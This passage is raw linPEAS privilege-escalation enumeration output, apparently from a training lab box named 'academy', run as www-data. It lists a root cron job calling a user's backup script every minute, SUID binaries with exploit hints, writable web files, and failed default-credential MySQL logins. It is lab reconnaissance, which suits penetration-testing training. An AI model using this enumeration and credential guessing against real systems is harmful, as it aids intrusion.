-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg
-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate
-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db
-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x  1 root root  813 Feb 10  2019 man-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


* * * * * /home/grimmie/backup.sh

[+] Services
[i] Search for outdated versions                                                                                                                               
 [ - ]  apache-htcacheclean                                                                                                                                    
 [ + ]  apache2
 [ + ]  apparmor
 [ - ]  console-setup.sh
 [ + ]  cron
 [ + ]  dbus
 [ - ]  hwclock.sh
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ + ]  mysql
 [ + ]  networking
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ + ]  ssh
 [ + ]  udev
 [ + ]  vsftpd


===================================( Network Information )====================================
[+] Hostname, hosts and DNS                                                                                                                                    
academy                                                                                                                                                        
127.0.0.1       localhost
127.0.1.1       academy.tcm.sec academy

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
domain localdomain
search localdomain
nameserver 172.16.2.2
tcm.sec

[+] Content of /etc/inetd.conf
/etc/inetd.conf Not Found                                                                                                                                      
                                                                                                                                                               
[+] Networks and neighbours
default         0.0.0.0                                                                                                                                        
loopback        127.0.0.0
link-local      169.254.0.0

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:a6:6e:61 brd ff:ff:ff:ff:ff:ff
    inet 172.16.2.129/24 brd 172.16.2.255 scope global dynamic ens33
       valid_lft 1638sec preferred_lft 1638sec
    inet6 fe80::20c:29ff:fea6:6e61/64 scope link 
       valid_lft forever preferred_lft forever
172.16.2.254 dev ens33 lladdr 00:50:56:ed:99:be STALE
172.16.2.2 dev ens33 lladdr 00:50:56:fc:a4:5b REACHABLE
172.16.2.1 dev ens33 lladdr 00:50:56:c0:00:08 REACHABLE

[+] Iptables rules
iptables rules Not Found                                                                                                                                       
                                                                                                                                                               
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                                                                            
                                                                                                                                                               
[+] Can I sniff with tcpdump?
No                                                                                                                                                             
                                                                                                                                                               

====================================( Users Information )=====================================
[+] My user                                                                                                                                                    
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups                                                                                         
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                          

[+] Do I have PGP keys?
gpg Not Found                                                                                                                                                  
                                                                                                                                                               
[+] Clipboard or highlighted text?
xsel and xclip Not Found                                                                                                                                       
                                                                                                                                                               
[+] Testing 'sudo -l' without password & /etc/sudoers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
                                                                                                                                                               
[+] Checking /etc/doas.conf
/etc/doas.conf Not Found                                                                                                                                       
                                                                                                                                                               
[+] Checking Pkexec policy
                                                                                                                                                               
[+] Don forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                              
                                                                                                                                                               
[+] Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                

[+] Users with console
grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash                                                                                                   
root:x:0:0:root:/root:/bin/bash

[+] Login information
 06:37:18 up  1:19,  1 user,  load average: 0.24, 0.06, 0.41                                                                                                   
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                10:18   29:42   0.04s  0.01s -bash
root     tty1                          Sat May 29 13:31 - down   (00:12)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:30 - 13:43  (00:13)
root     pts/0        192.168.10.31    Sat May 29 13:16 - 13:27  (00:11)
root     tty1                          Sat May 29 13:16 - down   (00:11)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:15 - 13:27  (00:12)
root     pts/0        192.168.10.31    Sat May 29 13:08 - 13:14  (00:06)
administ tty1                          Sat May 29 13:06 - down   (00:08)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:05 - 13:14  (00:08)

wtmp begins Sat May 29 13:05:58 2021

[+] All users
_apt                                                                                                                                                           
backup
bin
daemon
ftp
games
gnats
grimmie
irc
list
lp
mail
man
messagebus
mysql
news
nobody
proxy
root
sshd
sync
sys
systemd-coredump
systemd-network
systemd-resolve
systemd-timesync
uucp
www-data

[+] Password policy
PASS_MAX_DAYS   99999                                                                                                                                          
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512


===================================( Software Information )===================================
[+] MySQL version                                                                                                                                              
mysql  Ver 15.1 Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                      

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No                                                                                                    
[+] MySQL connection using root/NOPASS ................. No                                                                                                    
[+] Looking for mysql credentials and exec                                                                                                                     
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql                                                                     
Found readable /etc/mysql/my.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

[+] PostgreSQL version and pgadmin credentials
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                                                                       
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                                                                       
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                                                                       
                                                                                                                                                               
[+] Apache server info
Version: Server version: Apache/2.4.38 (Debian)                                                                                                                
Server built:   2020-08-25T20:08:29

[+] Looking for PHPCookies
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Wordpress wp-config.php files
wp-config.php Not Found                                                                                                                                        
                                                                                                                                                               
[+] Looking for Tomcat users file
tomcat-users.xml Not Found                                                                                                                                     
                                                                                                                                                               
[+] Mongo information
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for supervisord configuration file
supervisord.conf Not Found                                                                                                                                     
                                                                                                                                                               
[+] Looking for cesi configuration file
cesi.conf Not Found                                                                                                                                            
                                                                                                                                                               
[+] Looking for Rsyncd config file
/usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                      
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

[+] Looking for Hostapd config file
hostapd.conf Not Found                                                                                                                                         
                                                                                                                                                               
[+] Looking for wifi conns file
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Anaconda-ks config files
anaconda-ks.cfg Not Found                                                                                                                                      
                                                                                                                                                               
[+] Looking for .vnc directories and their passwd files
.vnc Not Found                                                                                                                                                 
                                                                                                                                                               
[+] Looking for ldap directories and their hashes
/etc/ldap                                                                                                                                                      
The password hash is from the {SSHA} to 'structural'

[+] Looking for .ovpn files and credentials
.ovpn Not Found                                                                                                                                                
                                                                                                                                                               
[+] Looking for ssl/ssh files
PermitRootLogin yes                                                                                                                                            
ChallengeResponseAuthentication no
UsePAM yes

Looking inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

[+] Looking for unexpected auth lines in /etc/pam.d/sshd
No                                                                                                                                                             
                                                                                                                                                               
[+] Looking for Cloud credentials (AWS, Azure, GC)
                                                                                                                                                               
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                         
/etc/exports Not Found                                                                                                                                         
                                                                                                                                                               
[+] Looking for kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                          
krb5.conf Not Found                                                                                                                                            
tickets kerberos Not Found                                                                                                                                     
klist Not Found                                                                                                                                                
                                                                                                                                                               
[+] Looking for Kibana yaml
kibana.yml Not Found                                                                                                                                           
                                                                                                                                                               
[+] Looking for logstash files
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for elasticsearch files
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Vault-ssh files
vault-ssh-helper.hcl Not Found                                                                                                                                 
                                                                                                                                                               
[+] Looking for AD cached hahses
cached hashes Not Found                                                                                                                                        
                                                                                                                                                               
[+] Looking for screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            
screen Not Found                                                                                                                                               
                                                                                                                                                               
[+] Looking for tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            
tmux Not Found                                                                                                                                                 
                                                                                                                                                               
[+] Looking for Couchdb directory
                                                                                                                                                               
[+] Looking for redis.conf
                                                                                                                                                               
[+] Looking for dovecot files
dovecot credentials Not Found                                                                                                                                  
                                                                                                                                                               
[+] Looking for mosquitto.conf
                                                                                                                                                               

====================================( Interesting Files )=====================================
[+] SUID                                                                                                                                                       
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                    
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn           --->    SuSE_9.3/10
/usr/bin/mount          --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/usr/bin/newgrp         --->    HP-UX_10.20
/usr/bin/umount         --->    BSD/Linux[1996-08-13]
/usr/bin/chsh
/usr/bin/passwd         --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM
/usr/bin/su
/usr/bin/gpasswd

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
/usr/sbin/unix_chkpwd                                                                                                                                          
/usr/bin/bsd-write
/usr/bin/expiry
/usr/bin/wall
/usr/bin/crontab
/usr/bin/dotlockfile
/usr/bin/chage
/usr/bin/ssh-agent

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                   
/usr/bin/ping = cap_net_raw+ep                                                                                                                                 

[+] .sh files in path
/usr/bin/gettext.sh                                                                                                                                            

[+] Files (scripts) in /etc/profile.d/
total 20                                                                                                                                                       
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh
-rw-r--r--  1 root root 1107 Sep 14  2018 gawk.csh
-rw-r--r--  1 root root  757 Sep 14  2018 gawk.sh

[+] Hashes inside passwd file? ........... No
[+] Can I read shadow files? ........... No                                                                                                                    
[+] Can I read root folder? ........... No                                                                                                                     
                                                                                                                                                               
[+] Looking for root files in home dirs (limit 20)
/home                                                                                                                                                          

[+] Looking for root files in folders owned by me
                                                                                                                                                               
[+] Readable files belonging to root and readable by me but not world readable
                                                                                                                                                               
[+] Files inside /home/www-data (limit 20)
                                                                                                                                                               
[+] Files inside others home (limit 20)
/home/grimmie/.bash_history                                                                                                                                    
/home/grimmie/.bashrc
/home/grimmie/backup.sh
/home/grimmie/.profile
/home/grimmie/.bash_logout

[+] Looking for installed mail applications
                                                                                                                                                               
[+] Mails (limit 50)
                                                                                                                                                               
[+] Backup files?
-rwxr-xr-- 1 grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh                                                                                    
-rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup

[+] Looking for tables inside readable .db/.sqlite files (limit 100)
                                                                                                                                                               
[+] Web files?(output limit)
/var/www/:                                                                                                                                                     
total 12K
drwxr-xr-x  3 root root 4.0K May 29  2021 .
drwxr-xr-x 12 root root 4.0K May 29  2021 ..
drwxr-xr-x  3 root root 4.0K May 29  2021 html

/var/www/html:
total 24K
drwxr-xr-x 3 root     root     4.0K May 29  2021 .
drwxr-xr-x 3 root     root     4.0K May 29  2021 ..

[+] *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .gitconfig, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml                                                                                                                                                   
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                            
-rw-r--r-- 1 root root 1994 Apr 18  2019 /etc/bash.bashrc                                                                                                      
-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile
-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 /home/grimmie/.bashrc
-rw-r--r-- 1 grimmie administrator 807 May 29  2021 /home/grimmie/.profile
-rw-r--r-- 1 root root 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
   139266      4 -rw-r--r--   1 grimmie  administrator      220 May 29  2021 /home/grimmie/.bash_logout                                                        
   270249      4 -rw-r--r--   1 root     root               240 Oct 15  2020 /usr/share/phpmyadmin/vendor/paragonie/constant_time_encoding/.travis.yml
   270133      4 -rw-r--r--   1 root     root               250 Oct 15  2020 /usr/share/phpmyadmin/vendor/bacon/bacon-qr-code/.travis.yml
   389530      4 -rw-r--r--   1 root     root               946 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.scrutinizer.yml
   389531      4 -rw-r--r--   1 root     root               706 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.travis.yml
   140294      4 -rw-r--r--   1 root     root               608 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/extensions/.travis.yml
   140341      4 -rw-r--r--   1 root     root              1004 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.travis.yml
   140340      4 -rw-r--r--   1 root     root               799 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.php_cs.dist
   140339      4 -rw-r--r--   1 root     root               224 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.editorconfig
   270226      4 -rw-r--r--   1 root     root               633 Oct 15  2020 /usr/share/phpmyadmin/vendor/google/recaptcha/.travis.yml
   138381      0 -rw-r--r--   1 root     root                 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch
    12136      0 -rw-r--r--   1 root     root                 0 Jul 29  2023 /run/network/.ifstate.lock
   260079      0 -rw-------   1 root     root                 0 May 29  2021 /etc/.pwd.lock
   259843      4 -rw-r--r--   1 root     root               220 Apr 18  2019 /etc/skel/.bash_logout

[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 100)
-rwxrwxrwx 1 www-data www-data 134167 Jul 29 06:32 /tmp/linpeas.sh                                                                                             
-rw-r--r-- 1 root root 11996 May 29  2021 /var/backups/apt.extended_states.0

[+] Interesting writable Files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                 
/dev/mqueue                                                                                                                                                    
/dev/mqueue/linpeas.txt
/dev/shm
/run/lock
/run/lock/apache2
/sys/kernel/security/apparmor/.access
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/tmp
/tmp/linpeas.sh
/var/cache/apache2/mod_cache_disk
/var/lib/php/sessions
/var/lib/phpmyadmin
/var/lib/phpmyadmin/tmp
/var/lib/phpmyadmin/tmp/twig
/var/lib/phpmyadmin/tmp/twig/15
/var/lib/phpmyadmin/tmp/twig/15/15a885ca9738e5a84084a3e52f1f6b23c771ea4f7bdca01081f7b87d3b86a6f9.php
/var/lib/phpmyadmin/tmp/twig/21
/var/lib/phpmyadmin/tmp/twig/21/21a3bee2bc40466295b888b9fec6fb9d77882a7cf061fd3f3d7194b5d54ab837.php
/var/lib/phpmyadmin/tmp/twig/22
/var/lib/phpmyadmin/tmp/twig/22/22f328e86274b51eb9034592ac106d133734cc8f4fba3637fe76b0a4b958f16d.php
/var/lib/phpmyadmin/tmp/twig/28
/var/lib/phpmyadmin/tmp/twig/28/28bcfd31671cb4e1cff7084a80ef5574315cd27a4f33c530bc9ae8da8934caf6.php
/var/lib/phpmyadmin/tmp/twig/2e
/var/lib/phpmyadmin/tmp/twig/2e/2e6ed961bffa8943f6419f806fe7bfc2232df52e39c5880878e7f34aae869dd9.php
/var/lib/phpmyadmin/tmp/twig/31
/var/lib/phpmyadmin/tmp/twig/31/317c8816ee34910f2c19f0c2bd6f261441aea2562acc0463975f80a4f0ed98a9.php
/var/lib/phpmyadmin/tmp/twig/36
/var/lib/phpmyadmin/tmp/twig/36/360a7a01227c90acf0a097d75488841f91dc2939cebca8ee28845b8abccb62ee.php
/var/lib/phpmyadmin/tmp/twig/3b
/var/lib/phpmyadmin/tmp/twig/3b/3bf8a6b93e8c4961d320a65db6c6f551428da6ae8b8e0c87200629b4ddad332d.php
/var/lib/phpmyadmin/tmp/twig/41
/var/lib/phpmyadmin/tmp/twig/41/4161342482a4d1436d31f5619bbdbd176c50e500207e3f364662f5ba8210fe31.php
/var/lib/phpmyadmin/tmp/twig/42
/var/lib/phpmyadmin/tmp/twig/42/426cadcf834dab31a9c871f8a7c8eafa83f4c66a2297cfefa7aae7a7895fa955.php
/var/lib/phpmyadmin/tmp/twig/43
/var/lib/phpmyadmin/tmp/twig/43/43cb8c5a42f17f780372a6d8b976cafccd1f95b8656d9d9638fca2bb2c0c1ee6.php
/var/lib/phpmyadmin/tmp/twig/4c
/var/lib/phpmyadmin/tmp/twig/4c/4c13e8023eae0535704510f289140d5447e25e2dea14eaef5988afa2ae915cb9.php
/var/lib/phpmyadmin/tmp/twig/4e
/var/lib/phpmyadmin/tmp/twig/4e/4e68050e4aec7ca6cfa1665dd465a55a5d643fca6abb104a310e5145d7310851.php
/var/lib/phpmyadmin/tmp/twig/4e/4e8f70ab052f0a5513536d20f156e0649e1791c083804a629624d2cb1e052f1f.php
/var/lib/phpmyadmin/tmp/twig/4f
/var/lib/phpmyadmin/tmp/twig/4f/4f7c1ace051b6b8cb85528aa8aef0052b72277f654cb4f13f2fc063f8529efe4.php
/var/lib/phpmyadmin/tmp/twig/53
/var/lib/phpmyadmin/tmp/twig/53/53ec6cf1deb6f8f805eb3077b06e6ef3b7805e25082d74c09563f91a11c1dfcd.php
/var/lib/phpmyadmin/tmp/twig/5c
/var/lib/phpmyadmin/tmp/twig/5c/5cf13d5a4ba7434d92bc44defee51a93cfbafa0d7984fcb8cbea606d97fe3e1a.php
/var/lib/phpmyadmin/tmp/twig/61
/var/lib/phpmyadmin/tmp/twig/61/61cf92e037fb131bad1ea24485b8e2ab7f0dd05dbe0bcdec85d8a96c80458223.php
/var/lib/phpmyadmin/tmp/twig/6b
/var/lib/phpmyadmin/tmp/twig/6b/6b8deef855b316d17c87795aebdf5aa33b55fae3e6c453d2a5bab7c4085f85d7.php
/var/lib/phpmyadmin/tmp/twig/6c
/var/lib/phpmyadmin/tmp/twig/6c/6c9a7cd11578d393beebc51daa9a48d35c8b03d3a69fd786c55ceedf71a62d29.php
/var/lib/phpmyadmin/tmp/twig/73
/var/lib/phpmyadmin/tmp/twig/73/73a22388ea06dda0a2e91e156573fc4c47961ae6e35817742bb6901eb91d5478.php
/var/lib/phpmyadmin/tmp/twig/73/73ee99e209023ff62597f3f6e5f027a498c1261e4d35d310b0d0a2664f3c2c0d.php
/var/lib/phpmyadmin/tmp/twig/78
/var/lib/phpmyadmin/tmp/twig/78/786fc5d49e751f699117fbb46b2e5920f5cdae9b5b3e7bb04e39d201b9048164.php
/var/lib/phpmyadmin/tmp/twig/7d
/var/lib/phpmyadmin/tmp/twig/7d/7d8087d41c482579730682151ac3393f13b0506f63d25d3b07db85fcba5cdbeb.php
/var/lib/phpmyadmin/tmp/twig/7f
/var/lib/phpmyadmin/tmp/twig/7f/7f2fea86c14cdbd8cd63e93670d9fef0c3d91595972a398d9aa8d5d919c9aa63.php
/var/lib/phpmyadmin/tmp/twig/8a
/var/lib/phpmyadmin/tmp/twig/8a/8a16ca4dbbd4143d994e5b20d8e1e088f482b5a41bf77d34526b36523fc966d7.php
/var/lib/phpmyadmin/tmp/twig/8b
/var/lib/phpmyadmin/tmp/twig/8b/8b3d6e41c7dc114088cc4febcf99864574a28c46ce39fd02d9577bec9ce900de.php
/var/lib/phpmyadmin/tmp/twig/96
/var/lib/phpmyadmin/tmp/twig/96/96885525f00ce10c76c38335c2cf2e232a709122ae75937b4f2eafcdde7be991.php
/var/lib/phpmyadmin/tmp/twig/97
/var/lib/phpmyadmin/tmp/twig/97/9734627c3841f4edcd6c2b6f193947fc0a7a9a69dd1955f703f4f691af6b45e3.php
/var/lib/phpmyadmin/tmp/twig/99
/var/lib/phpmyadmin/tmp/twig/99/9937763182924ca59c5731a9e6a0d96c77ec0ca5ce3241eec146f7bca0a6a0dc.php
/var/lib/phpmyadmin/tmp/twig/9d
/var/lib/phpmyadmin/tmp/twig/9d/9d254bc0e43f46a8844b012d501626d3acdd42c4a2d2da29c2a5f973f04a04e8.php
/var/lib/phpmyadmin/tmp/twig/9d/9d6c5c59ee895a239eeb5956af299ac0e5eb1a69f8db50be742ff0c61b618944.php
/var/lib/phpmyadmin/tmp/twig/9e
/var/lib/phpmyadmin/tmp/twig/9e/9ed23d78fa40b109fca7524500b40ca83ceec9a3ab64d7c38d780c2acf911588.php
/var/lib/phpmyadmin/tmp/twig/a0
/var/lib/phpmyadmin/tmp/twig/a0/a0c00a54b1bb321f799a5f4507a676b317067ae03b1d45bd13363a544ec066b7.php
/var/lib/phpmyadmin/tmp/twig/a4
/var/lib/phpmyadmin/tmp/twig/a4/a49a944225d69636e60c581e17aaceefffebe40aeb5931afd4aaa3da6a0039b9.php
/var/lib/phpmyadmin/tmp/twig/a7
/var/lib/phpmyadmin/tmp/twig/a7/a7e9ef3e1f57ef5a497ace07803123d1b50decbe0fcb448cc66573db89b48e25.php
/var/lib/phpmyadmin/tmp/twig/ae
/var/lib/phpmyadmin/tmp/twig/ae/ae25b735c0398c0c6a34895cf07f858207e235cf453cadf07a003940bfb9cd05.php
/var/lib/phpmyadmin/tmp/twig/af
/var/lib/phpmyadmin/tmp/twig/af/af668e5234a26d3e85e170b10e3d989c2c0c0679b2e5110d593a80b4f58c6443.php
/var/lib/phpmyadmin/tmp/twig/af/af6dd1f6871b54f086eb95e1abc703a0e92824251df6a715be3d3628d2bd3143.php
/var/lib/phpmyadmin/tmp/twig/af/afa81ff97d2424c5a13db6e43971cb716645566bd8d5c987da242dddf3f79817.php
/var/lib/phpmyadmin/tmp/twig/b6
/var/lib/phpmyadmin/tmp/twig/b6/b6c8adb0e14792534ce716cd3bf1d57bc78d45138e62be7d661d75a5f03edcba.php
/var/lib/phpmyadmin/tmp/twig/c3
/var/lib/phpmyadmin/tmp/twig/c3/c34484a1ece80a38a03398208a02a6c9c564d1fe62351a7d7832d163038d96f4.php
/var/lib/phpmyadmin/tmp/twig/c5
/var/lib/phpmyadmin/tmp/twig/c5/c50d1c67b497a887bc492962a09da599ee6c7283a90f7ea08084a548528db689.php
/var/lib/phpmyadmin/tmp/twig/c7
/var/lib/phpmyadmin/tmp/twig/c7/c70df99bff2eea2f20aba19bbb7b8d5de327cecaedb5dc3d383203f7d3d02ad2.php
/var/lib/phpmyadmin/tmp/twig/ca
/var/lib/phpmyadmin/tmp/twig/ca/ca32544b55a5ebda555ff3c0c89508d6e8e139ef05d8387a14389443c8e0fb49.php
/var/lib/phpmyadmin/tmp/twig/d6
/var/lib/phpmyadmin/tmp/twig/d6/d66c84e71db338af3aae5892c3b61f8d85d8bb63e2040876d5bbb84af484fb41.php
/var/lib/phpmyadmin/tmp/twig/dd
/var/lib/phpmyadmin/tmp/twig/dd/dd1476242f68168118c7ae6fc7223306d6024d66a38b3461e11a72d128eee8c1.php
/var/lib/phpmyadmin/tmp/twig/e8
/var/lib/phpmyadmin/tmp/twig/e8/e8184cd61a18c248ecc7e06a3f33b057e814c3c99a4dd56b7a7da715e1bc2af8.php
/var/lib/phpmyadmin/tmp/twig/e9
/var/lib/phpmyadmin/tmp/twig/e9/e93db45b0ff61ef08308b9a87b60a613c0a93fab9ee661c8271381a01e2fa57a.php
/var/lib/phpmyadmin/tmp/twig/f5
/var/lib/phpmyadmin/tmp/twig/f5/f589c1ad0b7292d669068908a26101f0ae7b5db110ba174ebc5492c80bc08508.php
/var/lib/phpmyadmin/tmp/twig/fa
/var/lib/phpmyadmin/tmp/twig/fa/fa249f377795e48c7d92167e29cef2fc31f50401a0bdbc95ddb51c0aec698b9e.php
/var/tmp
/var/www/html/academy
/var/www/html/academy/admin
/var/www/html/academy/admin/assets
/var/www/html/academy/admin/assets/css
/var/www/html/academy/admin/assets/css/bootstrap.css
/var/www/html/academy/admin/assets/css/font-awesome.css
/var/www/html/academy/admin/assets/css/style.css
/var/www/html/academy/admin/assets/fonts
/var/www/html/academy/admin/assets/fonts/FontAwesome.otf
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.eot
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.svg
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.ttf
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.eot
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.svg
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.ttf
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff2
/var/www/html/academy/admin/assets/img
/var/www/html/academy/admin/assets/js
/var/www/html/academy/admin/assets/js/bootstrap.js
/var/www/html/academy/admin/assets/js/jquery-1.11.1.js
/var/www/html/academy/admin/change-password.php
/var/www/html/academy/admin/check_availability.php
/var/www/html/academy/admin/course.php
/var/www/html/academy/admin/department.php
/var/www/html/academy/admin/edit-course.php
/var/www/html/academy/admin/enroll-history.php
/var/www/html/academy/admin/includes
/var/www/html/academy/admin/includes/config.php
/var/www/html/academy/admin/includes/footer.php
/var/www/html/academy/admin/includes/header.php
/var/www/html/academy/admin/includes/menubar.php
/var/www/html/academy/admin/index.php
/var/www/html/academy/admin/level.php
/var/www/html/academy/admin/logout.php
/var/www/html/academy/admin/manage-students.php
/var/www/html/academy/admin/print.php
/var/www/html/academy/admin/semester.php
/var/www/html/academy/admin/session.php
/var/www/html/academy/admin/student-registration.php
/var/www/html/academy/admin/user-log.php
/var/www/html/academy/assets
/var/www/html/academy/assets/css
/var/www/html/academy/assets/css/bootstrap.css
/var/www/html/academy/assets/css/font-awesome.css
/var/www/html/academy/assets/css/style.css
/var/www/html/academy/assets/fonts
/var/www/html/academy/assets/fonts/FontAwesome.otf
/var/www/html/academy/assets/fonts/fontawesome-webfont.eot
/var/www/html/academy/assets/fonts/fontawesome-webfont.svg
/var/www/html/academy/assets/fonts/fontawesome-webfont.ttf
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.eot
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.svg
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.ttf
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff2
/var/www/html/academy/assets/img
/var/www/html/academy/assets/js
/var/www/html/academy/assets/js/bootstrap.js
/var/www/html/academy/assets/js/jquery-1.11.1.js
/var/www/html/academy/change-password.php
/var/www/html/academy/check_availability.php
/var/www/html/academy/db
/var/www/html/academy/db/onlinecourse.sql
/var/www/html/academy/enroll-history.php
/var/www/html/academy/enroll.php
/var/www/html/academy/includes
/var/www/html/academy/includes/config.php
/var/www/html/academy/includes/footer.php
/var/www/html/academy/includes/header.php
